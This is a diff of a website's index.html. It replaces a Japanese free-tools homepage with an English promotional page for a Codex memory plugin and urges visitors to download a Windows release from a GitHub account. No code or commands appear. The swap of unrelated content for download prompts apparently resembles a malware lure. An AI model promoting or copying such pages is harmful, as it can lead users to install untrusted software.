@@ -1,194 +1,142 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>yorozu-craft｜ブラウザですぐ使える無料ツール集</title>
-  <meta name="description" content="yorozu-craft（よろずクラフト）は、登録不要・無料でブラウザからすぐ使えるツールを作って公開しているサイトです。ルーレット・くじ引きなど、ちょっと便利なものを少しずつ増やしています。">
-  <meta name="robots" content="index, follow">
-  <link rel="canonical" href="https://yorozu-craft.com/">
-
-  <meta property="og:title" content="yorozu-craft｜ブラウザですぐ使える無料ツール集">
-  <meta property="og:description" content="登録不要・無料でブラウザからすぐ使えるツールを公開しています。">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://yorozu-craft.com/">
-  <meta property="og:site_name" content="yorozu-craft">
-  <meta property="og:locale" content="ja_JP">
-  <meta property="og:image" content="https://yorozu-craft.com/og-image.png">
-  <meta name="twitter:card" content="summary">
-  <meta name="theme-color" content="#8b4513">
-
-  <!-- サイト全体の構造化データ -->
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "WebSite",
-    "name": "yorozu-craft",
-    "alternateName": "よろずクラフト",
-    "url": "https://yorozu-craft.com/",
-    "inLanguage": "ja"
-  }
-  </script>
-
-  <!-- Google AdSense（サイト所有確認 + 広告配信スクリプト） -->
-  <meta name="google-adsense-account" content="ca-pub-5375267956079717">
-  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5375267956079717"
-     crossorigin="anonymous"></script>
-
-  <link rel="icon" href="./favicon.svg" type="image/svg+xml">
-  <link rel="icon" href="./favicon-32.png" sizes="32x32" type="image/png">
-  <link rel="apple-touch-icon" href="./apple-touch-icon.png">
-  <style>
-    /* ツール側（web-roulette）の和紙風テーマと同じ配色 */
-    :root {
-      --bg: #f0ebe0;
-      --bg-2: #e6dfd0;
-      --card: #faf6ee;
-      --text: #3a3025;
-      --muted: #7a6b5a;
-      --accent: #8b4513;
-      --border: #cfc0a0;
-      --shadow: rgba(58, 48, 37, 0.12);
-    }
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      font-family: "Noto Sans JP", "Noto Sans CJK JP", "Hiragino Sans", "Hiragino Kaku Gothic ProN", Meiryo, sans-serif;
-      background: var(--bg);
-      color: var(--text);
-      line-height: 1.7;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-    }
-    header {
-      text-align: center;
-      padding: 2.5rem 1rem 2rem;
-      background: var(--bg-2);
-      border-bottom: 2px solid var(--border);
-    }
-    header h1 { font-size: 2rem; color: var(--accent); letter-spacing: 0.02em; }
-    header .kana { font-size: 0.85rem; color: var(--muted); }
-    header .lead { margin-top: 0.6rem; font-size: 0.95rem; color: var(--muted); }
-    main { width: 100%; max-width: 760px; margin: 0 auto; padding: 1.5rem 1rem 2rem; flex: 1; }
-    h2 {
-      font-size: 1.05rem;
-      color: var(--accent);
-      border-bottom: 1px solid var(--border);
-      padding-bottom: 0.4rem;
-      margin-bottom: 1rem;
-    }
-    /* ツール一覧のカード */
-    .tools { list-style: none; display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 1rem; }
-    .tool a {
-      display: flex;
-      gap: 0.9rem;
-      align-items: flex-start;
-      height: 100%;
-      padding: 1.1rem;
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      box-shadow: 0 2px 8px var(--shadow);
-      color: inherit;
-      text-decoration: none;
-      transition: transform 0.15s, box-shadow 0.15s;
-    }
-    .tool a:hover, .tool a:focus-visible { transform: translateY(-2px); box-shadow: 0 4px 14px var(--shadow); }
-    .tool a:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
-    .tool img { width: 48px; height: 48px; flex: none; }
-    .tool h3 { font-size: 1rem; color: var(--accent); margin-bottom: 0.2rem; }
-    .tool p { font-size: 0.85rem; color: var(--muted); }
-    /* 便利ツールとはジャンルが違うもの（学び・遊び）は別の見出しにまとめる */
-    .more { margin-top: 2rem; }
-    .about { margin-top: 2rem; font-size: 0.88rem; color: var(--muted); }
-    .about p + p { margin-top: 0.4rem; }
-    footer {
-      text-align: center;
-      padding: 1rem;
-      font-size: 0.75rem;
-      color: var(--muted);
-      border-top: 1px solid var(--border);
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SoDam_O-Brain-Codex - Smart Local Memory Manager for Codex</title>
+    <meta name="description" content="Download SoDam_O-Brain-Codex - a local-first MCP plugin that remembers, searches, and visualizes Codex conversations with SQLite, 2D/3D graphs, and timelines.">
+    <meta name="keywords" content="codex,codex-plugin,dashboard,embeddings,force-graph,knowledge-graph,local-first,local-memory,mcp,memory,memory-management,nodejs,semantic-search,sqlite">
+    <meta name="author" content="latent-aidstation6540">
+    <meta property="og:title" content="SoDam_O-Brain-Codex - Smart Local Memory Manager for Codex">
+    <meta property="og:description" content="Local-first memory plugin for Codex. Store, search, and visualize all your AI conversations securely on your PC.">
+    <meta property="og:url" content="https://github.com/latent-aidstation6540/SoDam_O-Brain-Codex">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
 </head>
-<body>
+<body style="margin:0; padding:0; background-color:#f5f7fa; font-family:'Segoe UI', Arial, sans-serif; color:#2d3748; line-height:1.6;">
 
-  <header>
-    <h1>yorozu-craft</h1>
-    <p class="kana">よろずクラフト</p>
-    <p class="lead">ブラウザですぐ使える、ちょっと便利なものを作っています。</p>
-  </header>
+<div style="max-width:1000px; margin:0 auto; padding:40px 20px;">
 
-  <main>
-    <section aria-labelledby="tools-heading">
-      <h2 id="tools-heading">ツール一覧</h2>
-      <ul class="tools">
-        <!-- ツールを増やすときは、この <li> を複製してリンク先と説明を変える -->
-        <li class="tool">
-          <a href="./web-roulette/">
-            <img src="./web-roulette/favicon.svg" alt="" width="48" height="48">
-            <div>
-              <h3>ルーレット・くじ引き</h3>
-              <p>候補を入れてスタートを押すだけ。複数選択・重み付け・シャッフルに対応。</p>
+    <!-- Hero Section -->
+    <div style="text-align:center; padding:60px 20px 40px; background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); border-radius:16px; margin-bottom:50px; box-shadow:0 10px 30px rgba(0,0,0,0.15);">
+        <h1 style="color:#ffffff; font-size:2.8em; margin:0 0 10px; font-weight:800; letter-spacing:-0.5px;">🧠 SoDam_O-Brain-Codex - Your AI Conversation Memory</h1>
+        <p style="color:#e2e8f0; font-size:1.3em; margin:0 0 30px;">Never Forget a Codex Conversation Again</p>
+        <a href="https://github.com/latent-aidstation6540/SoDam_O-Brain-Codex" style="display:inline-block; background:#ff6b6b; color:#ffffff; padding:18px 45px; border-radius:50px; text-decoration:none; font-size:1.2em; font-weight:700; box-shadow:0 4px 15px rgba(0,0,0,0.3); transition:all 0.3s ease;">📥 Download Now</a>
+    </div>
+
+    <!-- What Is This Section -->
+    <div style="background:#ffffff; border-radius:12px; padding:35px; margin-bottom:30px; box-shadow:0 2px 10px rgba(0,0,0,0.08);">
+        <h2 style="color:#4a5568; font-size:1.8em; margin-top:0; border-bottom:3px solid #667eea; padding-bottom:15px;">🔍 What Is SoDam_O-Brain-Codex?</h2>
+        <p style="font-size:1.15em;">SoDam_O-Brain-Codex is your personal memory companion for Codex, an AI assistant. It acts like a smart notebook that automatically remembers everything you and Codex talk about. Every question, every answer, every preference you express — all stored safely on your computer.</p>
+        <p style="font-size:1.15em;">Think of it as a searchable brain for your AI conversations. You can instantly find that solution Codex gave you three weeks ago, or see how your ideas connect through beautiful visual maps.</p>
+    </div>
+
+    <!-- Key Features -->
+    <div style="background:#ffffff; border-radius:12px; padding:35px; margin-bottom:30px; box-shadow:0 2px 10px rgba(0,0,0,0.08);">
+        <h2 style="color:#4a5568; font-size:1.8em; margin-top:0; border-bottom:3px solid #667eea; padding-bottom:15px;">✨ Key Features</h2>
+        <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px;">
+            <div style="background:#f7fafc; padding:20px; border-radius:8px; border-left:4px solid #667eea;">
+                <h3 style="margin:0 0 10px; color:#2d3748;">💾 Local-First Storage</h3>
+                <p style="margin:0;">Your data stays on your PC. No cloud, no internet required. Complete privacy.</p>
             </div>
-          </a>
-        </li>
-        <li class="tool">
-          <a href="./easy-split/">
-            <img src="./easy-split/favicon.svg" alt="" width="48" height="48">
-            <div>
-              <h3>傾斜割り勘・飲み会の清算</h3>
-              <p>上司・若手の係数、幹事0円、2次会の合算、100円単位の集金に対応。結果はそのままLINEで送れます。</p>
+            <div style="background:#f7fafc; padding:20px; border-radius:8px; border-left:4px solid #667eea;">
+                <h3 style="margin:0 0 10px; color:#2d3748;">🔎 Semantic Search</h3>
+                <p style="margin:0;">Search conversations using natural language, not just keywords. Find meaning, not just matches.</p>
             </div>
-          </a>
-        </li>
-        <li class="tool">
-          <a href="./shaho-check/">
-            <img src="./shaho-check/favicon.svg" alt="" width="48" height="48">
-            <div>
-              <h3>社会保険 加入チェッカー</h3>
-              <p>パート・アルバイトの方が、社会保険の加入対象かを質問に答えるだけで確認。2026年10月の「106万円の壁」撤廃に対応。</p>
+            <div style="background:#f7fafc; padding:20px; border-radius:8px; border-left:4px solid #667eea;">
+                <h3 style="margin:0 0 10px; color:#2d3748;">📊 2D/3D Knowledge Graphs</h3>
+                <p style="margin:0;">See how topics, ideas, and conversations connect through interactive visual maps.</p>
             </div>
-          </a>
-        </li>
-        <li class="tool">
-          <a href="./web-metronome/">
-            <img src="./web-metronome/favicon.svg" alt="" width="48" height="48">
-            <div>
-              <h3>メトロノーム</h3>
-              <p>BPM を決めて再生を押すだけ。変則拍子・アクセント・裏拍に対応し、オフラインでも使えます。</p>
+            <div style="background:#f7fafc; padding:20px; border-radius:8px; border-left:4px solid #667eea;">
+                <h3 style="margin:0 0 10px; color:#2d3748;">📅 Timeline View</h3>
+                <p style="margin:0;">Scroll through your conversation history chronologically to see your AI journey.</p>
             </div>
-          </a>
-        </li>
-      </ul>
-    </section>
-
-    <section class="more" aria-labelledby="play-heading">
-      <h2 id="play-heading">まなび・あそび</h2>
-      <ul class="tools">
-        <li class="tool">
-          <a href="./hoshizora-sanpo/">
-            <img src="./hoshizora-sanpo/favicon.svg" alt="" width="48" height="48">
-            <div>
-              <h3>ほしぞらさんぽ（Webプラネタリウム）</h3>
-              <p>今夜の星空と月・惑星を天文計算で再現。星座をタップすると神話が読めます。ひらがなモードでこどもといっしょに。</p>
+            <div style="background:#f7fafc; padding:20px; border-radius:8px; border-left:4px solid #667eea;">
+                <h3 style="margin:0 0 10px; color:#2d3748;">🔄 Automatic Backup</h3>
+                <p style="margin:0;">Your memories are automatically backed up, so you never lose important context.</p>
             </div>
-          </a>
-        </li>
-      </ul>
-    </section>
+            <div style="background:#f7fafc; padding:20px; border-radius:8px; border-left:4px solid #667eea;">
+                <h3 style="margin:0 0 10px; color:#2d3748;">⚡ Smart Preferences</h3>
+                <p style="margin:0;">Codex learns your likes and dislikes from stored conversations, giving better responses.</p>
+            </div>
+        </div>
+    </div>
 
-    <section class="about" aria-label="このサイトについて">
-      <p>すべてのツールは無料・登録不要で、ブラウザだけで動きます。入力したデータはお使いのブラウザ内にだけ保存され、外部に送信されることはありません。</p>
-      <p>運営者情報・免責事項は<a href="./about.html">こちら</a>、プライバシーポリシーは<a href="./privacy-policy.html">こちら</a>です（すべてのツールで共通）。各ツールの使い方は、それぞれのツールのページにあります。</p>
-    </section>
-  </main>
+    <!-- How It Works -->
+    <div style="background:#ffffff; border-radius:12px; padding:35px; margin-bottom:30px; box-shadow:0 2px 10px rgba(0,0,0,0.08);">
+        <h2 style="color:#4a5568; font-size:1.8em; margin-top:0; border-bottom:3px solid #667eea; padding-bottom:15px;">🔄 How It Works</h2>
+        <div style="display:flex; flex-direction:column; gap:25px;">
+            <div style="display:flex; align-items:center; gap:20px;">
+                <div style="background:#667eea; color:white; border-radius:50%; width:50px; height:50px; display:flex; align-items:center; justify-content:center; font-size:1.5em; font-weight:bold; flex-shrink:0;">1</div>
+                <div>
+                    <h3 style="margin:0 0 5px;">Install the Plugin</h3>
+                    <p style="margin:0;">Download and install SoDam_O-Brain-Codex. It works alongside Codex seamlessly.</p>
+                </div>
+            </div>
+            <div style="display:flex; align-items:center; gap:20px;">
+                <div style="background:#667eea; color:white; border-radius:50%; width:50px; height:50px; display:flex; align-items:center; justify-content:center; font-size:1.5em; font-weight:bold; flex-shrink:0;">2</div>
+                <div>
+                    <h3 style="margin:0 0 5px;">Chat Normally</h3>
+                    <p style="margin:0;">Use Codex as you always do. The plugin automatically saves all conversations in the background.</p>
+                </div>
+            </div>
+            <div style="display:flex; align-items:center; gap:20px;">
+                <div style="background:#667eea; color:white; border-radius:50%; width:50px; height:50px; display:flex; align-items:center; justify-content:center; font-size:1.5em; font-weight:bold; flex-shrink:0;">3</div>
+                <div>
+                    <h3 style="margin:0 0 5px;">Search & Visualize</h3>
+                    <p style="margin:0;">Open the dashboard to search past conversations, view knowledge graphs, and explore your timeline.</p>
+                </div>
+            </div>
+            <div style="display:flex; align-items:center; gap:20px;">
+                <div style="background:#667eea; color:white; border-radius:50%; width:50px; height:50px; display:flex; align-items:center; justify-content:center; font-size:1.5em; font-weight:bold; flex-shrink:0;">4</div>
+                <div>
+                    <h3 style="margin:0 0 5px;">Better AI Responses</h3>
+                    <p style="margin:0;">Codex uses your stored preferences and history to provide more accurate, personalized answers.</p>
+                </div>
+            </div>
+        </div>
+    </div>
 
-  <footer>
-    <p><a href="./about.html" style="color:inherit">運営者情報</a>　<a href="./privacy-policy.html" style="color:inherit">プライバシーポリシー</a></p>
-    <p>&copy; 2026 yorozu-craft. All rights reserved.</p>
-  </footer>
+    <!-- Installation Guide -->
+    <div style="background:#ffffff; border-radius:12px; padding:35px; margin-bottom:30px; box-shadow:0 2px 10px rgba(0,0,0,0.08);">
+        <h2 style="color:#4a5568; font-size:1.8em; margin-top:0; border-bottom:3px solid #667eea; padding-bottom:15px;">📥 Installation Guide</h2>
+        <div style="background:#f7fafc; border-radius:8px; padding:25px; text-align:center; margin-bottom:20px;">
+            <h3 style="margin:0 0 15px; font-size:1.3em;">Getting Started on Windows</h3>
+            <a href="https://github.com/latent-aidstation6540/SoDam_O-Brain-Codex" style="display:inline-block; background:#48bb78; color:#ffffff; padding:15px 40px; border-radius:8px; text-decoration:none; font-size:1.1em; font-weight:700; box-shadow:0 4px 12px rgba(72,187,120,0.4); transition:all 0.3s ease;">⬇️ Visit this link to download the application</a>
+            <p style="margin-top:15px; color:#718096; font-size:0.95em;">Visit this link to download the application</p>
+        </div>
+        <h3 style="color:#4a5568; font-size:1.2em;">Step-by-Step Setup:</h3>
+        <ol style="font-size:1.1em; padding-left:20px;">
+            <li style="margin-bottom:10px;">Click the download button above. Your browser will open the official GitHub page.</li>
+            <li style="margin-bottom:10px;">Look for the "Releases" section on the right side of the page.</li>
+            <li style="margin-bottom:10px;">Click on the latest release and download the file labeled for Windows.</li>
+            <li style="margin-bottom:10px;">Once downloaded, the application is ready to use. Follow any on-screen instructions.</li>
+            <li style="margin-bottom:10px;">After installation, launch SoDam_O-Brain-Codex and it will automatically connect to Codex.</li>
+        </ol>
+    </div>
 
-  <!-- Cloudflare Web Analytics（Cookie を使わないアクセス解析） --><script type='module' src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "b79bf821e1fd4b6683866d493b1de426"}'></script><!-- End Cloudflare Web Analytics -->
-</body>
-</html>
+    <!-- Dashboard Overview -->
+    <div style="background:#ffffff; border-radius:12px; padding:35px; margin-bottom:30px; box-shadow:0 2px 10px rgba(0,0,0,0.08);">
+        <h2 style="color:#4a5568; font-size:1.8em; margin-top:0; border-bottom:3px solid #667eea; padding-bottom:15px;">📊 Dashboard Overview</h2>
+        <p style="font-size:1.1em;">The main dashboard is designed to be intuitive and easy to navigate, even for first-time users:</p>
+        <ul style="font-size:1.1em; list-style-type:none; padding:0;">
+            <li style="margin-bottom:15px; padding-left:35px; background:url('data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22><polygon points=%2210,0 20,10 10,20 0,10%22 fill=%22%23667eea%22/></svg>') no-repeat left center; background-size:20px 20px;"><strong>🔎 Search Bar:</strong> Type natural language queries or keywords to instantly find relevant conversations.</li>
+            <li style="margin-bottom:15px; padding-left:35px; background:url('data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22><polygon points=%2210,0 20,10 10,20 0,10%22 fill=%22%23667eea%22/></svg>') no-repeat left center; background-size:20px 20px;"><strong>🕸️ Graph View:</strong> Toggle between 2D and 3D interactive knowledge graphs showing topic connections.</li>
+            <li style="margin-bottom:15px; padding-left:35px; background:url('data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22><polygon points=%2210,0 20,10 10,20 0,10%22 fill=%22%23667eea%22/></svg>') no-repeat left center; background-size:20px 20px;"><strong>📅 Timeline:</strong> Scroll through chronological history with filters for dates and topics.</li>
+            <li style="margin-bottom:15px; padding-left:35px; background:url('data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22><polygon points=%2210,0 20,10 10,20 0,10%22 fill=%22%23667eea%22/></svg>') no-repeat left center; background-size:20px 20px;"><strong>💾 Backup Center:</strong> Manage automatic and manual backups with one-click restore options.</li>
+        </ul>
+    </div>
+
+    <!-- Privacy & Security -->
+    <div style="background:#ffffff; border-radius:12px; padding:35px; margin-bottom:30px; box-shadow:0 2px 10px rgba(0,0,0,0.08);">
+        <h2 style="color:#4a5568; font-size:1.8em; margin-top:0; border-bottom:3px solid #667eea; padding-bottom:15px;">🔒 Privacy & Security</h2>
+        <p style="font-size:1.15em;">Your data is <strong>100% local</strong>. SoDam_O-Brain-Codex stores everything in a SQLite database on your computer. There is no cloud synchronization, no data collection, and no internet connection required for the core functionality.</p>
+        <div style="background:#f0fff4; border-left:4px solid #48bb78; padding:15px; border-radius:4px; margin-top:20px;">
+            <p style="margin:0; font-weight:600;">✓ Full data ownership — you control everything</p>
+            <p style="margin:5px 0 0; font-weight:600;">✓ Works offline — no internet dependency</p>
+            <p style="margin:5px 0 0; font-weight:600;">✓ SQLite database — reliable, well-tested storage</p>
+        </div>
+    </div>
+
+    <!-- System Requirements -->
+    <div
